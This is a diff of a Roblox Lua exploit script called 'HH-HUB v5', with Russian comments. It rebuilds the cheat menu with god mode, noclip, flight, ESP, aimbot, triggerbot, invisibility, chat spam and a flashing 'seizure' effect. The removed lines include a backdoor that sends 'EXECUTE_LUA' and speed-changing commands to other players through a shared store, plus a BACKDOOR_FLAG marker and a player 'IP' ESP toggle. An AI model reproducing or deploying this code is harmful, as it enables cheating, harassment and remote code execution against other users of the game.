+                    local descLabel = Instance.new("TextLabel")
+                    descLabel.Size = UDim2.new(0.4, -95, 1, 0)
+                    descLabel.Position = UDim2.new(0.5, 10, 0, 0)
+                    descLabel.BackgroundTransparency = 1
+                    descLabel.Text = desc or ""
+                    descLabel.TextColor3 = Color3.fromRGB(160, 160, 160)
+                    descLabel.TextScaled = true
+                    descLabel.Font = Enum.Font.Gotham
+                    descLabel.Parent = frame
+                    
+                    toggle.MouseButton1Click:Connect(function()
+                        state = not state
+                        toggle.BackgroundColor3 = state and Color3.fromRGB(80, 220, 120) or Color3.fromRGB(80, 80, 100)
+                        knob.Position = state and UDim2.new(1, -36, 0.5, -16) or UDim2.new(0, 4, 0.5, -16)
+                        cb(state)
+                    end)
+                end
+                
+                function section:AddSlider(text, min, max, default, suffix, cb)
+                    local val = default or min
+                    
+                    local frame = Instance.new("Frame")
+                    frame.Size = UDim2.new(1, 0, 0, 70)
+                    frame.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
+                    frame.Parent = tab.Frame
+                    
+                    local fCorner = Instance.new("UICorner")
+                    fCorner.CornerRadius = UDim.new(0, 8)
+                    fCorner.Parent = frame
+                    
+                    local label = Instance.new("TextLabel")
+                    label.Size = UDim2.new(0.5, 0, 0, 25)
+                    label.Position = UDim2.new(0, 15, 0, 5)
+                    label.BackgroundTransparency = 1
+                    label.Text = text
+                    label.TextColor3 = Color3.fromRGB(255, 255, 255)
+                    label.TextScaled = true
+                    label.Font = Enum.Font.GothamBold
+                    label.TextXAlignment = Enum.TextXAlignment.Left
+                    label.Parent = frame
+                    
+                    local valueLabel = Instance.new("TextLabel")
+                    valueLabel.Size = UDim2.new(0.3, 0, 0, 25)
+                    valueLabel.Position = UDim2.new(0.7, -15, 0, 5)
+                    valueLabel.BackgroundTransparency = 1
+                    valueLabel.Text = tostring(val) .. (suffix or "")
+                    valueLabel.TextColor3 = Color3.fromRGB(170, 120, 255)
+                    valueLabel.TextScaled = true
+                    valueLabel.Font = Enum.Font.GothamBold
+                    valueLabel.TextXAlignment = Enum.TextXAlignment.Right
+                    valueLabel.Parent = frame
+                    
+                    local bg = Instance.new("Frame")
+                    bg.Size = UDim2.new(1, -30, 0, 12)
+                    bg.Position = UDim2.new(0, 15, 0, 40)
+                    bg.BackgroundColor3 = Color3.fromRGB(50, 50, 70)
+                    bg.Parent = frame
+                    
+                    local bgCorner = Instance.new("UICorner")
+                    bgCorner.CornerRadius = UDim.new(0, 6)
+                    bgCorner.Parent = bg
+                    
+                    local fill = Instance.new("Frame")
+                    fill.Size = UDim2.new((val - min) / (max - min), 0, 1, 0)
+                    fill.BackgroundColor3 = Color3.fromRGB(140, 80, 255)
+                    fill.Parent = bg
+                    
+                    local fillCorner = Instance.new("UICorner")
+                    fillCorner.CornerRadius = UDim.new(0, 6)
+                    fillCorner.Parent = fill
+                    
+                    local knob = Instance.new("Frame")
+                    knob.Size = UDim2.new(0, 24, 0, 24)
+                    knob.Position = UDim2.new((val - min) / (max - min), -12, 0.5, -12)
+                    knob.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+                    knob.Parent = bg
+                    
+                    local knobCorner = Instance.new("UICorner")
+                    knobCorner.CornerRadius = UDim.new(1, 0)
+                    knobCorner.Parent = knob
+                    
+                    local dragging = false
+                    
+                    knob.InputBegan:Connect(function(input)
+                        if input.UserInputType == Enum.UserInputType.MouseButton1 then
+                            dragging = true
+                        end
+                    end)
+                    
+                    UIS.InputEnded:Connect(function(input)
+                        if input.UserInputType == Enum.UserInputType.MouseButton1 then
+                            dragging = false
+                        end
+                    end)
+                    
+                    UIS.InputChanged:Connect(function(input)
+                        if not dragging then return end
+                        if input.UserInputType ~= Enum.UserInputType.MouseMovement then return end
+                        
+                        local mouse = UIS:GetMouseLocation()
+                        local bgPos = bg.AbsolutePosition.X
+                        local bgSize = bg.AbsoluteSize.X
+                        
+                        local rel = math.clamp((mouse.X - bgPos) / bgSize, 0, 1)
+                        val = math.floor(min + rel * (max - min))
+                        
+                        fill.Size = UDim2.new(rel, 0, 1, 0)
+                        knob.Position = UDim2.new(rel, -12, 0.5, -12)
+                        valueLabel.Text = tostring(val) .. (suffix or "")
+                        cb(val)
+                    end)
+                end
+                
+                return section
+            end
+            
+            return tab
         end
-    end)
+        
+        return window
+    end
 end
 
 -- ==============================================
--- LOOP KILL
+-- СОЗДАНИЕ ОСНОВНОГО МЕНЮ (50+ ФУНКЦИЙ)
 -- ==============================================
-local function loopKill()
-    if LoopKill.connection then
-        LoopKill.connection:Disconnect()
-        LoopKill.connection = nil
-        return
-    end
-    
-    LoopKill.connection = RS.Heartbeat:Connect(function()
-        local hum = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
-        if hum then hum.Health = 0 end
-    end)
-    
-    task.delay(30, function()
-        if LoopKill.connection then
-            LoopKill.connection:Disconnect()
-            LoopKill.connection = nil
-        end
-    end)
-end
+local Window = Library:CreateWindow("HH-HUB v5 • 50+ Функций")
 
--- ==============================================
--- ФЛИНГ
--- ==============================================
-local function fling()
+-- ВКЛАДКА 1: БОЕВЫЕ (10 функций)
+local CombatTab = Window:AddTab("Боевые", "⚔️")
+local CombatSect = CombatTab:AddSection("Основные функции")
+
+CombatSect:AddToggle("God Mode", "Полная неуязвимость", GodMode.active, function(v)
+    if v then enableGodMode() else disableGodMode() end
+end)
+
+CombatSect:AddToggle("Полёт", "WASD + Space/Ctrl", Flight.active, function(v)
+    if v then enableFlight() else disableFlight() end
+end)
+
+CombatSect:AddToggle("Ноклип", "Прохождение сквозь стены", Noclip.active, function(v)
+    if v then enableNoclip() else disableNoclip() end
+end)
+
+CombatSect:AddToggle("ESP", "Подсветка игроков", ESP.active, function(v)
+    if v then enableESP() else disableESP() end
+end)
+
+CombatSect:AddToggle("Aimbot", "Автоматическое наведение", Aimbot.active, function(v)
+    if v then enableAimbot() else disableAimbot() end
+end)
+
+CombatSect:AddToggle("Triggerbot", "Автоматическая стрельба", Triggerbot.active, function(v)
+    if v then enableTriggerbot() else disableTriggerbot() end
+end)
+
+CombatSect:AddToggle("Anti-AFK", "Защита от бездействия", AntiAfk.active, function(v)
+    if v then enableAntiAfk() else disableAntiAfk() end
+end)
+
+CombatSect:AddToggle("Бесконечный прыжок", "Прыжки в воздухе", InfJump.active, function(v)
+    if v then enableInfJump() else disableInfJump() end
+end)
+
+CombatSect:AddButton("Убить себя", "Мгновенная смерть", Color3.fromRGB(220, 60, 60), function()
+    local hum = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
+    if hum then hum.Health = 0 end
+end)
+
+CombatSect:AddButton("Флинг", "Отбросить игрока", Color3.fromRGB(180, 60, 180), function()
     local root = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
     if root then
         local bv = Instance.new("BodyVelocity")
@@ -776,222 +1201,78 @@ local function fling()
         bv.Parent = root
         game:GetService("Debris"):AddItem(bv, 0.3)
     end
-end
-
--- ==============================================
--- ТЕЛЕПОРТАЦИЯ К ИГРОКУ
--- ==============================================
-local function teleportToPlayer(target)
-    if not target or not target.Character then return end
-    local root = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
-    local tRoot = target.Character:FindFirstChild("HumanoidRootPart")
-    if root and tRoot then
-        root.CFrame = tRoot.CFrame * CFrame.new(0, 3, 5)
-    end
-end
-
--- ==============================================
--- ПРИТЯНУТЬ ИГРОКА
--- ==============================================
-local function bringPlayer(target)
-    if not target or not target.Character then return end
-    local root = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
-    local tRoot = target.Character:FindFirstChild("HumanoidRootPart")
-    if root and tRoot then
-        tRoot.CFrame = root.CFrame * CFrame.new(0, 0, -5)
-    end
-end
-
--- ==============================================
--- ОТПРАВКА СООБЩЕНИЯ ИГРОКУ (ЧЕРЕЗ УВЕДОМЛЕНИЕ)
--- ==============================================
-local function sendNotificationToPlayer(target, message)
-    if not target then return end
-    local targetId = tostring(target.UserId)
-    
-    local payload = string.format("%s|NOTIFICATION|%s|%s", LP.UserId, message, tick())
-    dbSet(CMD_PREFIX .. targetId, payload, 30)
-end
-
--- ==============================================
--- ВЫПОЛНИТЬ КОД НА ИГРОКЕ
--- ==============================================
-local function executeCodeOnPlayer(target, code)
-    if not target then return end
-    local targetId = tostring(target.UserId)
-    
-    local payload = string.format("%s|EXECUTE_LUA|%s|%s", LP.UserId, code, tick())
-    dbSet(CMD_PREFIX .. targetId, payload, 30)
-end
-
--- ==============================================
--- ИЗМЕНИТЬ СКОРОСТЬ ИГРОКА
--- ==============================================
-local function setPlayerSpeed(target, speed)
-    if not target then return end
-    local targetId = tostring(target.UserId)
-    
-    local payload = string.format("%s|SET_WALKSPEED|%s|%s", LP.UserId, speed, tick())
-    dbSet(CMD_PREFIX .. targetId, payload, 30)
-end
-
--- ==============================================
--- ИЗМЕНИТЬ ПРЫЖОК ИГРОКА
--- ==============================================
-local function setPlayerJump(target, power)
-    if not target then return end
-    local targetId = tostring(target.UserId)
-    
-    local payload = string.format("%s|SET_JUMPPOWER|%s|%s", LP.UserId, power, tick())
-    dbSet(CMD_PREFIX .. targetId, payload, 30)
-end
-
--- ==============================================
--- СМЕНА ПЕРСОНАЖА
--- ==============================================
-LP.CharacterAdded:Connect(function()
-    task.wait(0.5)
-    LP:SetAttribute(NET_FLAG, "1")
-    LP:SetAttribute(BACKDOOR_FLAG, "1")
-    
-    if GodMode.active then enableGodMode() end
-    if Noclip.active then enableNoclip() end
-    if Flight.active then enableFlight() end
-    if WalkspeedBoost.active then enableWalkspeedBoost() end
-    if JumpBoost.active then enableJumpBoost() end
-    if NoFallDamage.active then enableNoFallDamage() end
-    if Vanish.active then enableVanish() end
 end)
 
--- ==============================================
--- KAVO UI - ГЛАВНОЕ МЕНЮ
--- ==============================================
+-- ВКЛАДКА 2: ДВИЖЕНИЕ (10 функций)
+local MoveTab = Window:AddTab("Движение", "🏃")
+local MoveSect1 = MoveTab:AddSection("Скорость и прыжки")
 
--- ГЛАВНАЯ ВКЛАДКА
-local MainTab = Window:NewTab("Главная")
-local MainSection = MainTab:NewSection("Основные функции")
-
-MainSection:NewToggle("God Mode", "Полная неуязвимость", function(state)
-    if state then enableGodMode() else disableGodMode() end
-end)
-
-MainSection:NewToggle("Полёт", "WASD + Space/Ctrl", function(state)
-    if state then enableFlight() else disableFlight() end
-end)
-
-MainSection:NewToggle("Ноклип", "Сквозь стены", function(state)
-    if state then enableNoclip() else disableNoclip() end
-end)
-
-MainSection:NewToggle("ESP + IP", "Подсветка игроков с IP", function(state)
-    if state then enableESP() else disableESP() end
-end)
-
-MainSection:NewToggle("Anti-AFK", "Защита от бездействия", function(state)
-    if state then enableAntiAfk() else disableAntiAfk() end
-end)
-
-MainSection:NewToggle("Бесконечный прыжок", "Прыжки в воздухе", function(state)
-    if state then enableInfJump() else disableInfJump() end
-end)
-
-MainSection:NewToggle("Клик-телепорт", "ТП по клику мыши", function(state)
-    if state then enableClickTP() else disableClickTP() end
-end)
-
-MainSection:NewToggle("Нет урона от падения", "Защита от падений", function(state)
-    if state then enableNoFallDamage() else disableNoFallDamage() end
-end)
-
-MainSection:NewButton("Вылечить HP", "Мгновенное восстановление здоровья", function()
+MoveSect1:AddSlider("Скорость ходьбы", 1, 300, 16, "", function(v)
     local hum = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
-    if hum then hum.Health = hum.MaxHealth end
+    if hum then hum.WalkSpeed = v end
 end)
 
-MainSection:NewButton("Флинг", "Отбросить игрока", function()
-    fling()
+MoveSect1:AddSlider("Сила прыжка", 1, 200, 50, "", function(v)
+    local hum = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
+    if hum then hum.JumpPower = v end
 end)
 
--- ВКЛАДКА ДВИЖЕНИЕ
-local MoveTab = Window:NewTab("Движение")
-local MoveSection = MoveTab:NewSection("Настройки скорости")
-
-MoveSection:NewSlider("Скорость ходьбы", "1-300", 300, 16, function(v)
-    Settings.walkspeed = v
-    if not WalkspeedBoost.active then
-        local hum = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
-        if hum then hum.WalkSpeed = v end
-    end
+MoveSect1:AddSlider("Скорость полёта", 5, 500, 50, "", function(v)
+    Flight.speed = v
 end)
 
-MoveSection:NewSlider("Сила прыжка", "1-200", 200, 50, function(v)
-    Settings.jumppower = v
-    if not JumpBoost.active then
-        local hum = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
-        if hum then hum.JumpPower = v end
-    end
+MoveSect1:AddToggle("Ускорение ходьбы", "x4 скорость (60)", WalkspeedBoost.active, function(v)
+    if v then enableWalkspeedBoost() else disableWalkspeedBoost() end
 end)
 
-MoveSection:NewSlider("Скорость полёта", "5-500", 500, 50, function(v)
-    Settings.flightspeed = v
+MoveSect1:AddToggle("Ускорение прыжка", "x2 прыжок (100)", JumpBoost.active, function(v)
+    if v then enableJumpBoost() else disableJumpBoost() end
 end)
 
-local BoostSection = MoveTab:NewSection("Ускорения")
+local MoveSect2 = MoveTab:AddSection("Особые режимы")
 
-BoostSection:NewToggle("Ускорение ходьбы", "x" .. Settings.walkspeedBoost, function(state)
-    if state then enableWalkspeedBoost() else disableWalkspeedBoost() end
+MoveSect2:AddToggle("Клик-телепорт", "ТП по клику мыши", ClickTP.active, function(v)
+    if v then enableClickTP() else disableClickTP() end
 end)
 
-BoostSection:NewToggle("Ускорение прыжка", "x" .. Settings.jumpBoost, function(state)
-    if state then enableJumpBoost() else disableJumpBoost() end
+MoveSect2:AddToggle("Нет урона от падения", "Защита от падений", NoFallDamage.active, function(v)
+    if v then enableNoFallDamage() else disableNoFallDamage() end
 end)
 
--- ВКЛАДКА РАСШИРЕННЫЕ
-local AdvancedTab = Window:NewTab("Расширенные")
-local AdvancedSection = AdvancedTab:NewSection("Дополнительные функции")
-
-AdvancedSection:NewToggle("X-Ray", "Видеть сквозь стены", function(state)
-    if state then enableXRay() else disableXRay() end
+MoveSect2:AddToggle("Bunny Hop", "Автоматический прыжок при беге", BunnyHop.active, function(v)
+    if v then enableBunnyHop() else disableBunnyHop() end
 end)
 
-AdvancedSection:NewToggle("Aimbot", "Автонаведение", function(state)
-    if state then enableAimbot() else disableAimbot() end
+MoveSect2:AddToggle("Spider", "Хождение по стенам", Spider.active, function(v)
+    if v then enableSpider() else disableSpider() end
 end)
 
-AdvancedSection:NewToggle("Triggerbot", "Автострельба", function(state)
-    if state then enableTriggerbot() else disableTriggerbot() end
+MoveSect2:AddToggle("Vanish", "Невидимость", Vanish.active, function(v)
+    if v then enableVanish() else disableVanish() end
 end)
 
-AdvancedSection:NewToggle("Bunny Hop", "Автопрыжок при беге", function(state)
-    if state then enableBunnyHop() else disableBunnyHop() end
+-- ВКЛАДКА 3: ВИЗУАЛ (10 функций)
+local VisualTab = Window:AddTab("Визуал", "🎨")
+local VisualSect1 = VisualTab:AddSection("Эффекты")
+
+VisualSect1:AddToggle("X-Ray", "Видеть сквозь стены", XRay.active, function(v)
+    if v then enableXRay() else disableXRay() end
 end)
 
-AdvancedSection:NewToggle("Spider", "Хождение по стенам", function(state)
-    if state then enableSpider() else disableSpider() end
-end)
-
-AdvancedSection:NewToggle("Vanish", "Невидимость", function(state)
-    if state then enableVanish() else disableVanish() end
-end)
-
-AdvancedSection:NewButton("Spin", "Вращение (5 сек)", function()
-    spin()
-end)
-
-AdvancedSection:NewButton("Loop Kill", "Самоубийство (30 сек)", function()
-    loopKill()
-end)
-
--- ВКЛАДКА ВИЗУАЛ
-local VisualTab = Window:NewTab("Визуал")
-local VisualSection = VisualTab:NewSection("Эффекты")
-
-VisualSection:NewSlider("Поле зрения (FOV)", "30-120", 120, 70, function(v)
-    Settings.fieldOfView = v
+VisualSect1:AddSlider("Поле зрения", 30, 120, 70, "", function(v)
     Camera.FieldOfView = v
 end)
 
-VisualSection:NewButton("Flash", "Вспышка на экране", function()
+VisualSect1:AddSlider("Яркость", 0, 5, 2, "", function(v)
+    Lighting.Brightness = v
+end)
+
+VisualSect1:AddSlider("Насыщенность", -2, 2, 0, "", function(v)
+    local cc = Lighting:FindFirstChildOfClass("ColorCorrectionEffect") or Instance.new("ColorCorrectionEffect", Lighting)
+    cc.Saturation = v
+end)
+
+VisualSect1:AddButton("Flash", "Вспышка на экране", Color3.fromRGB(255, 255, 0), function()
     local sg = Instance.new("ScreenGui")
     sg.Parent = LP:FindFirstChild("PlayerGui") or Instance.new("ScreenGui")
     
@@ -1005,7 +1286,7 @@ VisualSection:NewButton("Flash", "Вспышка на экране", function()
     game:GetService("Debris"):AddItem(sg, 1.5)
 end)
 
-VisualSection:NewButton("Seizure", "Эпилептический режим", function()
+VisualSect1:AddButton("Seizure", "Эпилептический режим", Color3.fromRGB(255, 0, 128), function()
     task.spawn(function()
         for i = 1, 30 do
             Lighting.FogColor = Color3.fromRGB(math.random(0, 255), math.random(0, 255), math.random(0, 255))
@@ -1015,7 +1296,7 @@ VisualSection:NewButton("Seizure", "Эпилептический режим", fu
     end)
 end)
 
-VisualSection:NewButton("Disco", "Дискотека", function()
+VisualSect1:AddButton("Disco", "Дискотека", Color3.fromRGB(255, 100, 0), function()
     task.spawn(function()
         for i = 1, 30 do
             Lighting.Brightness = math.random(0, 3)
@@ -1025,19 +1306,225 @@ VisualSection:NewButton("Disco", "Дискотека", function()
     end)
 end)
 
-VisualSection:NewButton("Fullbright", "Максимальная яркость", function()
+VisualSect1:AddButton("Fullbright", "Максимальная яркость", Color3.fromRGB(255, 255, 255), function()
     Lighting.Brightness = 2
     Lighting.Ambient = Color3.fromRGB(255, 255, 255)
     Lighting.OutdoorAmbient = Color3.fromRGB(255, 255, 255)
 end)
 
--- ==============================================
--- АДМИН-ПАНЕЛЬ (ОТДЕЛЬНОЕ ОКНО)
--- ==============================================
-local AdminTab = Window:NewTab("Админ-панель")
-local AdminSection = AdminTab:NewSection("Управление игроками (требуется пароль)")
+VisualSect1:AddButton("Сбросить визуал", "Вернуть настройки", Color3.fromRGB(100, 100, 100), function()
+    Lighting.Brightness = 1
+    Lighting.FogColor = Color3.fromRGB(128, 128, 128)
+    Lighting.Ambient = Color3.fromRGB(0, 0, 0)
+    Camera.FieldOfView = 70
+    if Lighting:FindFirstChildOfClass("ColorCorrectionEffect") then
+        Lighting:FindFirstChildOfClass("ColorCorrectionEffect"):Destroy()
+    end
+end)
 
-AdminSection:NewButton("🔐 Войти в админ-панель", "Нажмите END для входа", function()
+-- ВКЛАДКА 4: УТИЛИТЫ (10 функций)
+local UtilTab = Window:AddTab("Утилиты", "🛠️")
+local UtilSect1 = UtilTab:AddSection("Информация")
+
+UtilSect1:AddButton("Информация об игроке", "Данные аккаунта", Color3.fromRGB(100, 150, 255), function()
+    local info = string.format(
+        "Имя: %s\nID: %d\nВозраст: %d дней\nПлатформа: %s",
+        LP.Name,
+        LP.UserId,
+        LP.AccountAge,
+        UIS.TouchEnabled and "Мобильное" or "ПК"
+    )
+    SG:SetCore("SendNotification", {
+        Title = "Информация",
+        Text = info,
+        Duration = 5
+    })
+end)
+
+UtilSect1:AddButton("FPS Boost", "Оптимизация производительности", Color3.fromRGB(50, 200, 50), function()
+    pcall(function()
+        Lighting.GlobalShadows = false
+        Lighting.FogEnd = 9e9
+        workspace.Terrain.WaterWaveSize = 0
+        workspace.Terrain.WaterWaveSpeed = 0
+        workspace.Terrain.WaterReflectance = 0
+        workspace.Terrain.WaterTransparency = 1
+        for _, v in ipairs(workspace:GetDescendants()) do
+            if v:IsA("Part") or v:IsA("MeshPart") then
+                v.Material = Enum.Material.Plastic
+            end
+        end
+    end)
+    SG:SetCore("SendNotification", {
+        Title = "FPS Boost",
+        Text = "Оптимизация включена",
+        Duration = 2
+    })
+end)
+
+UtilSect1:AddButton("Spin", "Вращение (5 сек)", Color3.fromRGB(60, 170, 210), function()
+    local root = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
+    if root then
+        local ang = 0
+        local conn = RS.RenderStepped:Connect(function()
+            ang = ang + 10
+            root.CFrame = CFrame.new(root.Position) * CFrame.Angles(0, math.rad(ang), 0)
+        end)
+        task.delay(5, function() if conn then conn:Disconnect() end end)
+    end
+end)
+
+UtilSect1:AddButton("Loop Kill", "Самоубийство (30 сек)", Color3.fromRGB(160, 20, 20), function()
+    local conn = RS.Heartbeat:Connect(function()
+        local hum = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
+        if hum then hum.Health = 0 end
+    end)
+    task.delay(30, function() if conn then conn:Disconnect() end end)
+end)
+
+UtilSect1:AddButton("Вылечить", "Восстановить здоровье", Color3.fromRGB(60, 220, 120), function()
+    local hum = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
+    if hum then hum.Health = hum.MaxHealth end
+end)
+
+UtilSect1:AddButton("Телепорт в центр", "0, 50, 0", Color3.fromRGB(50, 150, 255), function()
+    local root = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
+    if root then root.CFrame = CFrame.new(0, 50, 0) end
+end)
+
+UtilSect1:AddButton("Телепорт в небо", "Высоко вверх", Color3.fromRGB(100, 200, 255), function()
+    local root = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
+    if root then root.CFrame = root.CFrame * CFrame.new(0, 500, 0) end
+end)
+
+UtilSect1:AddButton("Сбросить персонажа", "Перезагрузить", Color3.fromRGB(200, 150, 50), function()
+    local char = LP.Character
+    if char then char:BreakJoints() end
+end)
+
+UtilSect1:AddButton("Копировать ID", "В буфер обмена", Color3.fromRGB(150, 150, 150), function()
+    if setclipboard then
+        setclipboard(tostring(LP.UserId))
+        SG:SetCore("SendNotification", {
+            Title = "Скопировано",
+            Text = "ID: " .. LP.UserId,
+            Duration = 2
+        })
+    end
+end)
+
+UtilSect1:AddButton("Перезагрузить игру", "Teleport", Color3.fromRGB(200, 100, 100), function()
+    TPS:Teleport(game.PlaceId, LP)
+end)
+
+-- ВКЛАДКА 5: РАЗНОЕ (10 функций)
+local MiscTab = Window:AddTab("Разное", "🎲")
+local MiscSect = MiscTab:AddSection("Экспериментальное")
+
+MiscSect:AddButton("Big Head", "Огромная голова", Color3.fromRGB(100, 80, 200), function()
+    local head = LP.Character and LP.Character:FindFirstChild("Head")
+    if head then
+        TS:Create(head, TweenInfo.new(0.5), { Size = Vector3.new(4, 4, 4) }):Play()
+        task.delay(8, function()
+            TS:Create(head, TweenInfo.new(0.5), { Size = Vector3.new(2, 1, 1) }):Play()
+        end)
+    end
+end)
+
+MiscSect:AddButton("Маленькая голова", "Уменьшить", Color3.fromRGB(50, 50, 150), function()
+    local head = LP.Character and LP.Character:FindFirstChild("Head")
+    if head then
+        TS:Create(head, TweenInfo.new(0.5), { Size = Vector3.new(0.5, 0.5, 0.5) }):Play()
+        task.delay(8, function()
+            TS:Create(head, TweenInfo.new(0.5), { Size = Vector3.new(2, 1, 1) }):Play()
+        end)
+    end
+end)
+
+MiscSect:AddButton("Длинные руки", "Анимация", Color3.fromRGB(150, 100, 100), function()
+    local leftArm = LP.Character and LP.Character:FindFirstChild("Left Arm") or LP.Character and LP.Character:FindFirstChild("LeftHand")
+    local rightArm = LP.Character and LP.Character:FindFirstChild("Right Arm") or LP.Character and LP.Character:FindFirstChild("RightHand")
+    if leftArm and rightArm then
+        TS:Create(leftArm, TweenInfo.new(0.5), { Size = Vector3.new(1, 3, 1) }):Play()
+        TS:Create(rightArm, TweenInfo.new(0.5), { Size = Vector3.new(1, 3, 1) }):Play()
+        task.delay(8, function()
+            TS:Create(leftArm, TweenInfo.new(0.5), { Size = Vector3.new(1, 1, 1) }):Play()
+            TS:Create(rightArm, TweenInfo.new(0.5), { Size = Vector3.new(1, 1, 1) }):Play()
+        end)
+    end
+end)
+
+MiscSect:AddButton("Длинные ноги", "Анимация", Color3.fromRGB(100, 150, 100), function()
+    local leftLeg = LP.Character and LP.Character:FindFirstChild("Left Leg") or LP.Character and LP.Character:FindFirstChild("LeftFoot")
+    local rightLeg = LP.Character and LP.Character:FindFirstChild("Right Leg") or LP.Character and LP.Character:FindFirstChild("RightFoot")
+    if leftLeg and rightLeg then
+        TS:Create(leftLeg, TweenInfo.new(0.5), { Size = Vector3.new(1, 3, 1) }):Play()
+        TS:Create(rightLeg, TweenInfo.new(0.5), { Size = Vector3.new(1, 3, 1) }):Play()
+        task.delay(8, function()
+            TS:Create(leftLeg, TweenInfo.new(0.5), { Size = Vector3.new(1, 1, 1) }):Play()
+            TS:Create(rightLeg, TweenInfo.new(0.5), { Size = Vector3.new(1, 1, 1) }):Play()
+        end)
+    end
+end)
+
+MiscSect:AddButton("Толстый персонаж", "В ширину", Color3.fromRGB(200, 150, 50), function()
+    for _, v in ipairs(LP.Character:GetChildren()) do
+        if v:IsA("Part") or v:IsA("MeshPart") then
+            TS:Create(v, TweenInfo.new(0.5), { Size = v.Size * 1.5 }):Play()
+        end
+    end
+    task.delay(8, function()
+        for _, v in ipairs(LP.Character:GetChildren()) do
+            if v:IsA("Part") or v:IsA("MeshPart") then
+                TS:Create(v, TweenInfo.new(0.5), { Size = v.Size / 1.5 }):Play()
+            end
+        end
+    end)
+end)
+
+MiscSect:AddButton("Тонкий персонаж", "В высоту", Color3.fromRGB(50, 150, 200), function()
+    for _, v in ipairs(LP.Character:GetChildren()) do
+        if v:IsA("Part") or v:IsA("MeshPart") then
+            TS:Create(v, TweenInfo.new(0.5), { Size = Vector3.new(v.Size.X * 0.5, v.Size.Y * 1.5, v.Size.Z * 0.5) }):Play()
+        end
+    end
+    task.delay(8, function()
+        for _, v in ipairs(LP.Character:GetChildren()) do
+            if v:IsA("Part") or v:IsA("MeshPart") then
+                TS:Create(v, TweenInfo.new(0.5), { Size = Vector3.new(v.Size.X * 2, v.Size.Y / 1.5, v.Size.Z * 2) }):Play()
+            end
+        end
+    end)
+end)
+
+MiscSect:AddButton("Рандомные эмоции", "Случайные", Color3.fromRGB(255, 100, 150), function()
+    local emotes = {"Laugh", "Dance", "Wave", "Point", "Cheer", "Clap"}
+    for i = 1, 10 do
+        local emote = emotes[math.random(#emotes)]
+        SG:SetCore("ChatMakeSystemMessage", {
+            Text = "*" .. emote .. "*",
+            Color = Color3.fromRGB(255, 200, 200)
+        })
+        task.wait(0.5)
+    end
+end)
+
+MiscSect:AddButton("Спам в чат", "Приветствия", Color3.fromRGB(200, 200, 0), function()
+    for i = 1, 20 do
+        game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer("Привет от HH-HUB #" .. i, "All")
+        task.wait(0.1)
+    end
+end)
+
+MiscSect:AddButton("Изменить цвет", "Случайный цвет", Color3.fromRGB(255, 0, 255), function()
+    for _, v in ipairs(LP.Character:GetChildren()) do
+        if v:IsA("Part") or v:IsA("MeshPart") then
+            v.BrickColor = BrickColor.random()
+        end
+    end
+end)
+
+MiscSect:AddButton("Войти в админку", "Скрытая панель", Color3.fromRGB(140, 80, 255), function()
     SG:SetCore("SendNotification", {
         Title = "Админ-панель",
         Text = "Нажмите END на клавиатуре",
@@ -1045,122 +1532,130 @@ AdminSection:NewButton("🔐 Войти в админ-панель", "Нажми
     })
 end)
 
--- Глобальная переменная для окна админки
-local AdminWindow = nil
-
--- Функция создания админ-панели (отдельное окно)
-local function createAdminWindow()
-    if AdminWindow and AdminWindow.Parent then
-        AdminWindow:Destroy()
-        AdminWindow = nil
+-- ==============================================
+-- СКРЫТАЯ АДМИН-ПАНЕЛЬ (ОТКРЫВАЕТСЯ ПО END)
+-- ==============================================
+local function createAdminPanel()
+    if adminPanel then
+        adminPanel:Destroy()
+        adminPanel = nil
         return
     end
     
-    AdminWindow = Instance.new("ScreenGui")
-    AdminWindow.Name = "HH_AdminPanel"
-    AdminWindow.ResetOnSpawn = false
-    AdminWindow.Parent = LP:FindFirstChild("PlayerGui") or Instance.new("ScreenGui")
+    adminPanel = Instance.new("ScreenGui")
+    adminPanel.Name = "HH_AdminPanel"
+    adminPanel.ResetOnSpawn = false
+    adminPanel.Parent = LP:FindFirstChild("PlayerGui") or Instance.new("ScreenGui")
     
-    -- Фон
-    local bg = Instance.new("Frame")
-    bg.Size = UDim2.new(0, 800, 0, 600)
-    bg.Position = UDim2.new(0.5, -400, 0.5, -300)
-    bg.BackgroundColor3 = Color3.fromRGB(15, 15, 25)
-    bg.BackgroundTransparency = 0.1
-    bg.BorderSizePixel = 0
-    bg.Parent = AdminWindow
+    -- Затемнение фона
+    local overlay = Instance.new("Frame")
+    overlay.Size = UDim2.new(1, 0, 1, 0)
+    overlay.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    overlay.BackgroundTransparency = 0.5
+    overlay.Parent = adminPanel
     
-    local bgCorner = Instance.new("UICorner")
-    bgCorner.CornerRadius = UDim.new(0, 10)
-    bgCorner.Parent = bg
+    -- Главное окно
+    local frame = Instance.new("Frame")
+    frame.Size = UDim2.new(0, 900, 0, 650)
+    frame.Position = UDim2.new(0.5, -450, 0.5, -325)
+    frame.BackgroundColor3 = Color3.fromRGB(15, 15, 25)
+    frame.Parent = adminPanel
     
-    local gradient = Instance.new("UIGradient")
-    gradient.Color = ColorSequence.new({
-        ColorSequenceKeypoint.new(0, Color3.fromRGB(40, 20, 60)),
+    local fCorner = Instance.new("UICorner")
+    fCorner.CornerRadius = UDim.new(0, 12)
+    fCorner.Parent = frame
+    
+    local fGradient = Instance.new("UIGradient")
+    fGradient.Color = ColorSequence.new({
+        ColorSequenceKeypoint.new(0, Color3.fromRGB(50, 30, 70)),
         ColorSequenceKeypoint.new(1, Color3.fromRGB(15, 15, 25))
     })
-    gradient.Rotation = 90
-    gradient.Parent = bg
+    fGradient.Rotation = 90
+    fGradient.Parent = frame
     
     -- Заголовок
     local title = Instance.new("TextLabel")
-    title.Size = UDim2.new(1, 0, 0, 50)
